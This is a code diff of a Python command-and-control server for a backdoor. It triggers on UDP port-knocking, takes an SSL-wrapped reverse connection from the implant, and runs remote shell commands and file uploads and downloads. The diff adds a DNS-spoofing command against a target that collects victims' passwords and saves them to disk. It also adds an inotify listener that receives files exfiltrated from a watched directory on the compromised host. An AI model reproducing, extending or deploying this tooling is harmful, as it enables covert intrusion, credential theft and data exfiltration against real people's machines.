@@ -1,17 +1,19 @@
 #!/usr/bin/python
 # import python modules
 from socket import *
+import ssl
 import os.path
 import knocker
+import server_config
 from scapy.all import *
 from utils import decrypt, parse_port_to_data
+from multiprocessing import Process
 
-EOF = 'G'
-PATH_TO_FILE = "./data/"
 CONTENT = ""
 DOWNLOAD_FILE_SIZE = 0
 DOWNLOAD_FILE_NAME = ""
-PORT = 4433  # port for inside out connection
+NOTIFY_SOCKET = ""
+INOTIFY = ""
 
 def upload(conn,command,filepath):
     if os.path.isfile(filepath):
@@ -49,22 +51,81 @@ def parse_for_download(pkt):
 def parse_by_character(char):
     global CONTENT
     global DOWNLOAD_FILE_SIZE
-    if char == EOF:
+    if char == server_config.EOF:
         if DOWNLOAD_FILE_SIZE == str(len(CONTENT)):
             decrypted = decrypt(CONTENT , knocker.PASS)
-            global PATH_TO_FILE
             global DOWNLOAD_FILE_NAME
-            if not os.path.exists(PATH_TO_FILE):
-                os.makedirs(PATH_TO_FILE)
-            with open(PATH_TO_FILE +DOWNLOAD_FILE_NAME, 'w') as f:
+            if not os.path.exists(server_config.PATH_TO_FILE):
+                os.makedirs(server_config.PATH_TO_FILE)
+            with open(server_config.PATH_TO_FILE +DOWNLOAD_FILE_NAME, 'w') as f:
                 f.write(decrypted)
-            print "data is successfully saved to " + PATH_TO_FILE + DOWNLOAD_FILE_NAME
+            print "data is successfully saved to " + server_config.PATH_TO_FILE + DOWNLOAD_FILE_NAME
         else:
             print "some data is missing. cannot decrypt the file"
         return True
     else:
         CONTENT += char
         return False
+
+def dns(command, conn, cmdArgs):
+    if len(cmdArgs) == 7 and cmdArgs[1] == "start":
+        conn.send(command)
+    elif len(cmdArgs) == 2 and cmdArgs[1] == "stop":
+        conn.send(command)
+        data = conn.recv(1024)
+        if not os.path.exists(server_config.PATH_TO_FILE):
+            os.makedirs(server_config.PATH_TO_FILE)
+        with open(server_config.PATH_TO_FILE + server_config.DNSPOOF_PASSWORD_FILE, 'a') as f:
+            f.write(data)
+        print "passwords: " + data
+        print "passwords are successfully saved to "+server_config.PATH_TO_FILE + server_config.DNSPOOF_PASSWORD_FILE
+    else:
+        print "Invalid command. "
+        print "Usage:"
+        print "To start dns spoofing : dnspoof start SENDER_IP SENDER_MAC TARGET_IP ROUTER_IP DOMAIN"
+        print "To stop dns spoofing : dnspoof stop"
+
+
+def notify(command, conn, cmdArgs):
+    global INOTIFY
+    if len(cmdArgs) == 3 and  cmdArgs[1] == "start":
+        conn.send(command)
+        INOTIFY = Process(target=open_connection_for_inotify)
+        INOTIFY.start()
+    elif len(cmdArgs) == 2 and cmdArgs[1] == "stop":
+        conn.send(command)
+        INOTIFY.terminate()
+    else:
+        print "Invalid command. Please enter inotify start directory or inotify stop"
+
+def open_connection_for_inotify():
+    HOST = ''  # '' means bind to all interfaces
+    s = socket.socket(AF_INET, SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((HOST, server_config.INOTIFY_PORT))
+    s.listen(1024)
+    conn, addr = s.accept()
+    NOTIFY_SOCKET = ssl.wrap_socket(conn,
+                                    server_side=True,
+                                    certfile="./../certificate/server.crt",
+                                    keyfile="./../certificate/server.key")
+
+    while 1:
+        filesizeAndName = NOTIFY_SOCKET.recv(1024)
+        if filesizeAndName:
+            filesizeAndNameArray = filesizeAndName.split(' ')
+            fs = filesizeAndNameArray[1]
+            with open(filesizeAndNameArray[0], "wb") as f:
+                dr = NOTIFY_SOCKET.recv(1024)
+                f.write(dr)
+                totalFS = len(dr)
+                while dr:
+                    if str(totalFS) != fs:
+                        dr = NOTIFY_SOCKET.recv(1024)
+                        f.write(dr)
+                        totalFS += len(dr)
+                    else:
+                        break
 
 
 def accept_commands(conn):
@@ -80,11 +141,22 @@ def accept_commands(conn):
             conn.send(command)
             break
         elif cmdArgs[0] == "upload":
-            upload(conn,command,cmdArgs[1])
+            if len(cmdArgs) == 2:
+                upload(conn,command,cmdArgs[1])
+            else:
+                print "Invalid command. Please enter upload filename"
 
         elif cmdArgs[0] == "download":
-            conn.send(command)
-            download(conn, cmdArgs[1])
+            if len(cmdArgs) == 2:
+                conn.send(command)
+                download(conn, cmdArgs[1])
+            else:
+                print "Invalid command. Please enter download filename"
+
+        elif cmdArgs[0] == "dnspoof":
+            dns(command, conn, cmdArgs)
+        elif cmdArgs[0] == "inotify":
+            notify(command, conn, cmdArgs)
         else:
             conn.send(command)
             # receive output from linux command
@@ -96,31 +168,35 @@ def accept_commands(conn):
 
 def listen_for_inside_out_conn():
     HOST = ''  # '' means bind to all interfaces
-    global PORT
     # create our socket handler
     s = socket.socket(AF_INET, SOCK_STREAM)
     # set is so that when we cancel out we can reuse port
-    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     # bind to interface
-    s.bind((HOST, PORT))
+    s.bind((HOST, server_config.PORT))
     # print we are accepting connections
-    print "Looking for snake bites on port %s" % str(PORT)
+    print "Looking for snake bites on port %s" % str(server_config.PORT)
     # listen for only 10 connection
     s.listen(10)
     # accept connections
     conn, addr = s.accept()
     # print connected by ipaddress
     print 'Connected by', addr[0]
+    # wrap with SSL
+    wrappedconn = ssl.wrap_socket(conn,
+                                 server_side=True,
+                                 certfile="./../certificate/server.crt",
+                                 keyfile="./../certificate/server.key")
     if addr[0] == knocker.SOURCE_IP:
-        accept_commands(conn)
+        accept_commands(wrappedconn)
     print "closing connection"
-    conn.close()
-    s.close()
+    wrappedconn.shutdown(socket.SHUT_RDWR)
+    wrappedconn.close()
 
 def parse_packets_for_port_knocking(pkt):
-    if pkt.haslayer(UDP) and pkt['UDP'].dport == knocker.PORT_KNOCKER[knocker.PORT_KNOCKER_INDEX]:
+    if pkt.haslayer(UDP) and pkt['UDP'].dport == server_config.PORT_KNOCK_ARRAY[knocker.PORT_KNOCKER_INDEX]:
         knocker.port_knock(pkt)
-        if len(knocker.PASS) == len(knocker.PORT_KNOCKER)*2:
+        if len(knocker.PASS) == len(server_config.PORT_KNOCK_ARRAY)*2:
             return True
         else:
             return False
